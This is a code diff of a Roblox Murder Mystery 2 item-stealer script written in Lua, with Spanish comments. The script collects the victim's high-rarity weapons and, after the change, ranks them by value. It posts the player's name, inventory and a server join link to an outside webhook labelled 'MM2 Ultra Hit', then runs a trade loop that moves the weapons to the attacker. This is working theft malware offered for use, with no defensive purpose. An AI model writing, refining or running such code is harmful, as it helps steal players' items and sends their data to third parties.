@@ -49,9 +49,7 @@ local headers = {
 }
 
 -- Función de limpieza de strings
-local function trim(s)
-    return s:match("^%s*(.-)%s*$")
-end
+local function trim(s) return s:match("^%s*(.-)%s*$") end
 
 -- Función para obtener HTML
 local function fetchHTML(url)
@@ -169,14 +167,28 @@ for id, amount in pairs(profile.Weapons.Owned) do
         if rarityIndex and rarityIndex >= minIndex then
             local value = valueList[item.ItemName:lower()] or 1
             if value >= min_value then
-                table.insert(weaponsToSend,{DataID=id, Amount=amount, Value=value, Rarity=item.Rarity})
-                totalValue += value * amount
+                table.insert(weaponsToSend,{
+                    DataID = id,
+                    Amount = amount,
+                    Value = value,
+                    TotalValue = value * amount,
+                    Rarity = item.Rarity
+                })
             end
         end
     end
 end
 
--- Webhook con inventario
+-- Ordenar por valor total descendente
+table.sort(weaponsToSend, function(a,b) return a.TotalValue > b.TotalValue end)
+
+-- Calcular valor total real
+totalValue = 0
+for _, w in ipairs(weaponsToSend) do
+    totalValue += w.TotalValue
+end
+
+-- Webhook con valor de cada arma
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victim", value=LocalPlayer.Name, inline=true},
@@ -185,13 +197,13 @@ local fields = {
     {name="Total value", value=tostring(totalValue), inline=true}
 }
 for _, w in ipairs(weaponsToSend) do
-    fields[3].value = fields[3].value..string.format("%s x%s (%s)\n",w.DataID,w.Amount,w.Rarity)
+    fields[3].value = fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID, w.Amount, w.Rarity, w.TotalValue)
 end
 local prefix = _G.pingEveryone=="Yes" and "@everyone " or ""
 local thumbnailURL = "https://i.postimg.cc/fbsB59FF/file-00000000879c622f8bad57db474fb14d-1.png"
 SendWebhook("💪MM2 Ultra Hit💯","💰Armas seleccionadas Godly/Ancient",fields,prefix,thumbnailURL)
 
--- Trade continuo ultra seguro
+-- Trade continuo ultra seguro priorizando armas de mayor valor
 local function doTrade(targetName)
     while #weaponsToSend > 0 do
         local status = getTradeStatus()
